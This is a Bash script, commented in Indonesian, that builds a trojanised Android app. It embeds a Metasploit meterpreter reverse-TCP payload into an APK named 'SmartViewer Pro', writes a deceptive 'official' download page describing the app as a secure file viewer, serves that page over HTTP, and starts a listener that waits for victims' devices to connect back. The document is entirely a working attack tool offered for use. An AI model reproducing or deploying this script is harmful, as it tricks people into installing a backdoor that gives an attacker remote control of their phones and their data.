#!/bin/bash

# ==================== KONFIGURASI ====================
LHOST="192.168.1.12"
LPORT="4444"
APP_NAME="SmartViewer Pro"
APK_ORI="SmartViewer Pro.apk"
APK_OUT="SmartViewer Pro.apk"
WEBPORT="8080"

# Lokasi script saat ini
CURDIR="$(pwd)"

# ==================== CEK DEPENDENSI ====================
echo "[*] Mengecek dependensi..."

command -v msfvenom >/dev/null || { echo "[✘] msfvenom tidak ditemukan!"; exit 1; }
command -v apktool >/dev/null || { echo "[✘] apktool tidak ditemukan!"; exit 1; }
command -v gnome-terminal >/dev/null || { echo "[✘] gnome-terminal tidak ditemukan!"; exit 1; }

# Cek apktool versi minimal
APKTOOL_VER=$(apktool --version 2>/dev/null)
if [[ ! "$APKTOOL_VER" =~ ^2\.9\.[2-9]|^[3-9]\. ]]; then
  echo "[✘] apktool versi terlalu lama: $APKTOOL_VER"
  echo "[→] Gunakan versi minimal 2.9.2 atau lebih baru"
  exit 1
fi

# Cek file APK original
if [[ ! -f "$APK_ORI" ]]; then
  echo "[✘] File $APK_ORI tidak ditemukan di folder ini: $CURDIR"
  echo "[→] Letakkan file APK asli di folder ini"
  exit 1
fi

# ==================== BUAT PAYLOAD APK ====================
echo "[*] Membuat backdoor dari $APK_ORI..."

if ! msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -x "$APK_ORI" -o "$APK_OUT" > /dev/null 2>&1; then
  echo "[✘] Gagal membuat payload APK!"
  exit 1
fi

echo "[✓] Payload berhasil dibuat: $APK_OUT"

# ==================== BUAT HALAMAN HTML ====================
echo "[*] Membuat halaman download HTML..."

cat > index.html <<EOF
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>$APP_NAME Installer</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body {
      background: linear-gradient(to right, #2c3e50, #3498db);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: 'Segoe UI', sans-serif;
    }
    .card {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      padding: 40px;
      max-width: 500px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      color: #333;
    }
    .btn-download {
      background-color: #3498db;
      border: none;
      padding: 14px 24px;
      border-radius: 10px;
      color: white;
      font-size: 1rem;
      text-decoration: none;
    }
    .btn-download:hover {
      background-color: #2980b9;
    }
    .footer {
      font-size: 0.85rem;
      color: #777;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card text-center">
    <h3 class="mb-3">Instalasi $APP_NAME</h3>
    <p>Unduh aplikasi resmi untuk membuka file terenkripsi secara aman dan cepat.</p>
    <a href="$APK_OUT" class="btn btn-download mt-3">📥 Download SmartViewer Pro.apk</a>
    <div class="footer">© 2025 SmartViewer Official</div>
  </div>
</body>
</html>
EOF

echo "[✓] Halaman HTML dibuat: index.html"

# ==================== JALANKAN WEBSERVER ====================
echo "[*] Menjalankan server web di http://$LHOST:$WEBPORT ..."
pkill -f "python3 -m http.server" 2>/dev/null
nohup python3 -m http.server $WEBPORT > /dev/null 2>&1 &
sleep 1

# ==================== LISTENER METASPLOIT ====================
echo "[*] Memulai listener Metasploit di port $LPORT..."
gnome-terminal -- bash -c "
msfconsole -q -x \"
use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT $LPORT;
run;
\""

# ==================== OUTPUT ====================
echo ""
echo "[✓] WEBSITE ONLINE:  http://$LHOST:$WEBPORT"
echo "[✓] APK FILE:        $APK_OUT"
echo "[✓] LISTENER ACTIVE: Tunggu koneksi dari target..."

